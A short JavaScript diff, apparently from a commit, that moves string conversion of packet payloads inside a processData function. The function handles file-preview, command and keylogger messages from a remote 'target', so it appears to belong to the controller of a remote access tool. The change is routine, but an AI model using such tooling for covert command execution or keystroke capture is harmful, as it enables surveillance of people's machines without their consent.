@@ -103,7 +103,7 @@ export function processData (data, target) {
     var packetID = data.slice(0, 4).readInt32LE()
     var statusCode = data.slice(4, 8).readInt32LE()
     var totalLength = data.slice(8, 12).readInt32LE()
-    var content = data.slice(12, totalLength).toString()
+    var content = data.slice(12, totalLength)
 
     const cb = callback.get(packetID)
 
@@ -129,7 +129,7 @@ export function processData (data, target) {
                 case 'filepreview':
                   target.filepreviewQueue.shift()
                   if (index[key] === 0) {
-                    cb(content)
+                    cb(content.toString())
                     // console.log(clientList[0].filepreviewQueue)
                   } else {
                     console.log('packet lost')
@@ -156,7 +156,7 @@ export function processData (data, target) {
                 case 'command':
                   target.commandQueue.shift()
                   if (index[key] === 0) {
-                    cb(content)
+                    cb(content.toString())
                     // console.log(clientList[0].filepreviewQueue)
                   } else {
                     console.log('packet lost')
@@ -169,7 +169,7 @@ export function processData (data, target) {
           break
         case 203:
           // updateKeyLogger(content)
-          cb(content)
+          cb(content.toString())
           break
         case 204:
           // stopKeyLogger(content)
